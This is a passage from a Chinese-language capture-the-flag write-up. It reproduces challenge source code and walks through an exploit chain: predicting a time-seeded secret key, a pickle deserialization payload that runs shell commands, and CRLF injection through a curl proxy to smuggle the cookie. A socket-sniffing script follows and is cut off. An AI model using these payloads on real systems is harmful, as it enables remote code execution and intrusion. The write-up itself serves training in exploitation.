class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#app.py</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> dbus</span><br><span class="line"><span class="keyword">import</span> dbus.service</span><br><span class="line"><span class="keyword">import</span> dbus.mainloop.glib</span><br><span class="line"><span class="keyword">from</span> gi.repository <span class="keyword">import</span> GLib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secretKey = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setSecretKet</span>():</span><br><span class="line">    <span class="keyword">global</span> secretKey</span><br><span class="line">    secretKey = hashlib.md5(random.randbytes(<span class="number">16</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">setSecretKet()</span><br><span class="line">app.secret_key = secretKey</span><br><span class="line">loginList = &#123;&#125;</span><br><span class="line">login_fail_times = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyDBusService</span>(dbus.service.Object):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, bus_name, object_path</span>):</span><br><span class="line">        dbus.service.Object.__init__(self, bus_name, object_path)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @dbus.service.method(<span class="params"><span class="string">&quot;ctf.syncServer&quot;</span>, in_signature=<span class="string">&#x27;&#x27;</span>, out_signature=<span class="string">&#x27;s&#x27;</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ping</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;pong&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @dbus.service.method(<span class="params"><span class="string">&quot;ctf.syncServer&quot;</span>, in_signature=<span class="string">&#x27;ss&#x27;</span>, out_signature=<span class="string">&#x27;s&#x27;</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backdoor</span>(<span class="params">self, username, key</span>):</span><br><span class="line">        <span class="keyword">global</span> secretKey</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> loginList <span class="keyword">and</span> key == secretKey:</span><br><span class="line">            data = pickle.loads(base64.b64decode(loginList[username]))</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;keyError&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">global</span> loginList</span><br><span class="line">    <span class="keyword">global</span> login_fail_times</span><br><span class="line">    <span class="keyword">if</span> login_fail_times == <span class="number">5</span>:</span><br><span class="line">        login_fail_times = <span class="number">0</span></span><br><span class="line">        session[<span class="string">&#x27;code&#x27;</span>] = hashlib.md5(random.randbytes(<span class="number">16</span>)).hexdigest()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">        setSecretKet()</span><br><span class="line">    username = request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = request.args.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    data = request.cookies.get(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> code != session[<span class="string">&#x27;code&#x27;</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;codeError&quot;</span></span><br><span class="line">    <span class="keyword">if</span> username == <span class="string">&quot;admin&quot;</span> <span class="keyword">and</span> password == <span class="string">&quot;123456&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> data != <span class="string">&quot;&quot;</span>:</span><br><span class="line">            loginList[username] = data</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            loginList[username] = <span class="string">&quot;no&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;login successful&quot;</span></span><br><span class="line">    login_fail_times += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Password error&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/getCode&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getCode</span>():</span><br><span class="line">    random.seed(<span class="built_in">int</span>(time.time() * <span class="number">10</span>))</span><br><span class="line">    session[<span class="string">&#x27;code&#x27;</span>] = hashlib.md5(random.randbytes(<span class="number">16</span>)).hexdigest()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> session[<span class="string">&#x27;code&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbusServerStart</span>():</span><br><span class="line">    dbus.mainloop.glib.DBusGMainLoop(set_as_default=<span class="literal">True</span>)</span><br><span class="line">    bus = dbus.SystemBus()</span><br><span class="line">    bus_name = dbus.service.BusName(<span class="string">&quot;ctf.syncServer&quot;</span>, bus)</span><br><span class="line">    service = MyDBusService(bus_name, <span class="string">&quot;/ctf/syncServer&quot;</span>)</span><br><span class="line">    loop = GLib.MainLoop()</span><br><span class="line">    loop.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    threading.Thread(target=dbusServerStart).start()</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># flagService.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> dbus, time</span><br><span class="line"><span class="keyword">import</span> dbus.service</span><br><span class="line"><span class="keyword">import</span> dbus.mainloop.glib</span><br><span class="line"><span class="keyword">from</span> gi.repository <span class="keyword">import</span> GLib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FlagService</span>(dbus.service.Object):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, bus_name, object_path</span>):</span><br><span class="line">        dbus.service.Object.__init__(self, bus_name, object_path)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @dbus.service.method(<span class="params"><span class="string">&quot;ctf.flag.service&quot;</span>, in_signature=<span class="string">&#x27;&#x27;</span>, out_signature=<span class="string">&#x27;s&#x27;</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ping</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;pong&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @dbus.service.method(<span class="params"><span class="string">&quot;ctf.flag.service&quot;</span>, in_signature=<span class="string">&#x27;s&#x27;</span>, out_signature=<span class="string">&#x27;s&#x27;</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getTime</span>(<span class="params">self, <span class="built_in">format</span></span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">__import__</span>(<span class="string">&quot;json&quot;</span>).dumps(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">1</span>, <span class="string">&quot;time&quot;</span>: time.strftime(<span class="built_in">format</span>, time.localtime())&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dbus.mainloop.glib.DBusGMainLoop(set_as_default=<span class="literal">True</span>)</span><br><span class="line">bus = dbus.SystemBus()</span><br><span class="line">bus_name = dbus.service.BusName(<span class="string">&quot;ctf.flag.service&quot;</span>, bus)</span><br><span class="line">service = FlagService(bus_name, <span class="string">&quot;/ctf/flag/service&quot;</span>)</span><br><span class="line">loop = GLib.MainLoop()</span><br><span class="line">loop.run()</span><br></pre></td></tr></table></figure></p><h2 id="预测secretkey，设置反序列化数据"><a href="#预测secretkey，设置反序列化数据" class="headerlink" title="预测secretkey，设置反序列化数据"></a>预测secretkey，设置反序列化数据</h2><p>可以看到 <code>/getCode</code> 路由以当前时间设置了随机数，并且返回了随机数的前4位，并且在 <code>/login</code> 中<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> login_fail_times == <span class="number">5</span>:</span><br><span class="line">    login_fail_times = <span class="number">0</span></span><br><span class="line">    session[<span class="string">&#x27;code&#x27;</span>] = hashlib.md5(random.randbytes(<span class="number">16</span>)).hexdigest()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">    setSecretKet()</span><br></pre></td></tr></table></figure><br>当失败次数达到5次，会重新设置随机数和session。<br>那么利用链如下，以下给出post数据包<br>通过php去访问 <code>/getCode</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=curl&amp;url=http%3A%2F%2F127.0.0.1%3A8080%2FgetCode&amp;method=GET</span><br></pre></td></tr></table></figure><br>得到session和key，拿到key，用以下的脚本去预测<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># 已知的MD5哈希值的前四位</span></span><br><span class="line">known_md5_prefix = <span class="string">&quot;3061&quot;</span>  <span class="comment"># 示例值，替换为你已知的前四位值</span></span><br><span class="line">a=<span class="built_in">int</span>(time.time() * <span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">b=a-<span class="number">28800</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="comment"># 起始种子值</span></span><br><span class="line">start_seed = b</span><br><span class="line">           <span class="comment">#17172611574</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_md5_prefix</span>(<span class="params">seed</span>):</span><br><span class="line">    random.seed(seed)</span><br><span class="line">    rand_bytes = random.randbytes(<span class="number">16</span>)</span><br><span class="line">    md5_hash = hashlib.md5(rand_bytes).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> md5_hash[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_seed</span>(<span class="params">start_seed, known_md5_prefix</span>):</span><br><span class="line">    current_seed = start_seed</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        md5_prefix = generate_md5_prefix(current_seed)</span><br><span class="line">        <span class="keyword">if</span> md5_prefix == known_md5_prefix:</span><br><span class="line">            <span class="keyword">return</span> current_seed</span><br><span class="line">        current_seed += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行爆破</span></span><br><span class="line">found_seed = find_seed(start_seed, known_md5_prefix)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Found seed: <span class="subst">&#123;found_seed&#125;</span>&quot;</span>)</span><br><span class="line">random.seed(found_seed)</span><br><span class="line">code = hashlib.md5(random.randbytes(<span class="number">16</span>)).hexdigest()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">code = hashlib.md5(random.randbytes(<span class="number">16</span>)).hexdigest()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">key = hashlib.md5(random.randbytes(<span class="number">16</span>)).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(code)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure></p><blockquote><p>最后的key就是secretkey，因为有时差，所以需要减去28800</p></blockquote><p>拿到key和cookie以后保存成一个正常的数据包，然后通过php的method参数注入数据包(因为需要注入cookie)，data是反序列化数据<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># data.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64,random,hashlib,time</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># command=r&#x27;echo &quot;import os\\ndef dumps(a):\\n\\tos.system(\&quot;touch /tmp/aaa &amp;&amp; chmod 777 /flag\&quot;)&quot; &gt; /app/json.py 2&gt;&amp;1&#x27;</span></span><br><span class="line">        command = <span class="string">r&#x27;which dbus-send &gt; /tmp/a&#x27;</span></span><br><span class="line">        <span class="comment"># command = r&#x27;ls /bin &gt; /tmp/a&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(command,))</span><br><span class="line"> </span><br><span class="line">p=Person()</span><br><span class="line">opcode=pickle.dumps(p)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(opcode))</span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=curl&amp;method=GET%20/login%3Fusername%3Dadmin%26password%3D123456%26code%3Dbeb3%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A8080%0D%0ACookie%3A%20session%3DeyJjb2RlIjoiYmViMyJ9.ZluEVA.boOh1u9A19w52LCwRIl8-BiYJkc%3Bdata%3DgASVLQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBJkYnVzLXNlbmQgPiAvdG1wL2GUhZRSlC4%3D%3B&amp;url=http://127.0.0.1:8080/login?username=admin&amp;password=123456&amp;data=username</span><br></pre></td></tr></table></figure><br>然后把密码输错5次，之后就可以重置了secretkey</p><h2 id="dbus协议分析"><a href="#dbus协议分析" class="headerlink" title="dbus协议分析"></a>dbus协议分析</h2><p>因为dbus底层也是socket，可以通过一个脚本给他改成可以抓成pcap包<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   UNIX域Socket抓包</span></span><br><span class="line"><span class="comment">#   </span></span><br><span class="line"><span class="comment">#   作者：RToax</span></span><br><span class="line"><span class="comment">#   时间：2020年11月9日</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"> </span><br><span class="line">exe_name=<span class="variable">$0</span></span><br><span class="line">eth_port=<span class="string">&quot;lo&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#UNIX socket 文件路径</span></span><br><span class="line">unix_path=/tmp/unix.sock</span><br><span class="line">unix_path_original=<span class="string">&quot;<span class="variable">$unix_path</span>.original&quot;</span></span><br><span class="line">ARG_UNIX_PATH=<span class="string">&quot;-u&quot;</span></span><br><span class="line">ARG_UNIX_PATH_S=<span class="string">&quot;UNIX socket path name.&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#抓包文件</span></span><br><span class="line">pcap_switch=0</span><br><span class="line">pcap_file=pcap.pcap</span><br><span class="line">ARG_PCAP_FILE=<span class="string">&quot;-f&quot;</span></span><br><span class="line">ARG_PCAP_FILE_S=<span class="string">&quot;Pcap File Name. default <span class="variable">$pcap_file</span>, no set no save.&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#临时端口</span></span><br><span class="line">tcp_port=8087</span><br><span class="line">ARG_TCP_PORT=<span class="string">&quot;-p&quot;</span></span><br><span class="line">ARG_TCP_PORT_S=<span class="string">&quot;TMP port for swap UNIX socket. default <span class="variable">$tcp_port</span>&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#显示包的比特信息，如下：</span></span><br><span class="line"><span class="comment"># 0x0000:  4500 0034 52ae 4000 4006 ea13 7f00 0001</span></span><br><span class="line"><span class="comment"># 0x0010:  7f00 0001 c82a 07cf 6a88 73d9 bfa9 666c</span></span><br><span class="line"><span class="comment"># 0x0020:  8010 01f8 fe28 0000 0101 080a a2d6 9545</span></span><br><span class="line"><span class="comment"># 0x0030:  a2d6 9545</span></span><br><span class="line">pbits_flag=0</span><br><span class="line">ARG_PBITS_DETAIL=<span class="string">&quot;-x&quot;</span></span><br><span class="line">ARG_PBITS_DETAIL_S=<span class="string">&quot;Show Packet Bits.&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#帮助信息</span></span><br><span class="line">ARG_USAGE=<span class="string">&quot;-h&quot;</span></span><br><span class="line">ARG_USAGE_S=<span class="string">&quot;Show usage.&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#tcpdump的参数</span></span><br><span class="line">ARG_TCPDUMP=<span class="string">&quot; -i <span class="variable">$eth_port</span> -netvvv -N -q &quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">usage</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;<span class="variable">$exe_name</span> [option] [value]\n&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;    <span class="variable">$ARG_UNIX_PATH</span>   <span class="variable">$ARG_UNIX_PATH_S</span> \n&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;    <span class="variable">$ARG_PCAP_FILE</span>   <span class="variable">$ARG_PCAP_FILE_S</span>\n&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;    <span class="variable">$ARG_TCP_PORT</span>   <span class="variable">$ARG_TCP_PORT_S</span>\n&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;    <span class="variable">$ARG_PBITS_DETAIL</span>   <span class="variable">$ARG_PBITS_DETAIL_S</span>\n&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;    <span class="variable">$ARG_USAGE</span>   <span class="variable">$ARG_USAGE_S</span>\n&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">parse_args</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    argvs=($(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$@</span>&quot;</span>))</span><br><span class="line">    elements=$[ <span class="variable">$#</span> - 1 ]</span><br><span class="line">    <span class="keyword">for</span> (( i = 0; i &lt;= <span class="variable">$elements</span>; i++ ))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment"># 解析抓包文件参数</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$&#123;argvs[$i]&#125;</span> = <span class="variable">$ARG_USAGE</span> ]; <span class="keyword">then</span></span><br><span class="line">            usage</span><br><span class="line">            <span class="built_in">return</span> 1</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        <span class="comment"># 解析UNIXsocket路径参数</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$&#123;argvs[$i]&#125;</span> = <span class="variable">$ARG_UNIX_PATH</span> ]; <span class="keyword">then</span></span><br><span class="line">            unix_path=<span class="variable">$&#123;argvs[<span class="variable">$&#123;i&#125;</span>+1]&#125;</span></span><br><span class="line">            <span class="comment">#文件必须存在</span></span><br><span class="line">            <span class="keyword">if</span> [ ! -e <span class="variable">$unix_path</span> ]; <span class="keyword">then</span> </span><br><span class="line">                <span class="built_in">printf</span> <span class="string">&quot;Unix Path not exist. <span class="variable">$unix_path</span>\n&quot;</span></span><br><span class="line">                <span class="built_in">printf</span> <span class="string">&quot;TYPE&gt;&gt; <span class="variable">$exe_name</span> <span class="variable">$ARG_USAGE</span> for help.\n&quot;</span></span><br><span class="line">                <span class="built_in">return</span> 1</span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">            <span class="comment">#文件必须为Socket类型</span></span><br><span class="line">            <span class="keyword">if</span> [ ! -S <span class="variable">$unix_path</span> ]; <span class="keyword">then</span> </span><br><span class="line">                <span class="built_in">printf</span> <span class="string">&quot;File must be Unix Socket Path. <span class="variable">$unix_path</span>\n&quot;</span></span><br><span class="line">                <span class="built_in">printf</span> <span class="string">&quot;TYPE&gt;&gt; <span class="variable">$exe_name</span> <span class="variable">$ARG_USAGE</span> for help.\n&quot;</span></span><br><span class="line">                <span class="built_in">return</span> 1</span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        <span class="comment"># 解析抓包文件参数</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$&#123;argvs[$i]&#125;</span> = <span class="variable">$ARG_PCAP_FILE</span> ]; <span class="keyword">then</span></span><br><span class="line">            pcap_file=<span class="variable">$&#123;argvs[<span class="variable">$&#123;i&#125;</span>+1]&#125;</span></span><br><span class="line">            pcap_switch=1</span><br><span class="line">            <span class="keyword">if</span> [ -e <span class="variable">$pcap_file</span> ]; <span class="keyword">then</span> </span><br><span class="line">                <span class="built_in">printf</span> <span class="string">&quot;PCAP file: <span class="variable">$pcap_file</span> exist, overwrite it.\n&quot;</span></span><br><span class="line">                <span class="built_in">printf</span> <span class="string">&quot;TYPE&gt;&gt; <span class="variable">$exe_name</span> <span class="variable">$ARG_USAGE</span> for help.\n&quot;</span></span><br><span class="line">                <span class="built_in">rm</span> -f <span class="variable">$pcap_file</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 显示包的比特信息</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$&#123;argvs[$i]&#125;</span> = <span class="variable">$ARG_PBITS_DETAIL</span> ]; <span class="keyword">then</span></span><br><span class="line">            pbits_flag=1</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        <span class="comment"># 解析临时端口参数</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$&#123;argvs[$i]&#125;</span> = <span class="variable">$ARG_TCP_PORT</span> ]; <span class="keyword">then</span></span><br><span class="line">            tcp_port=<span class="variable">$&#123;argvs[<span class="variable">$&#123;i&#125;</span>+1]&#125;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> 0</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> [ ! -e  /usr/bin/socat ]; <span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;Not socat found, install socat first.\n&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">fi</span> </span><br><span class="line"><span class="keyword">if</span> [ ! -e  /usr/sbin/tcpdump ]; <span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;Not tcpdump found, install tcpdump first.\n&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">fi</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#没有参数直接退出</span></span><br><span class="line"><span class="keyword">if</span> [ 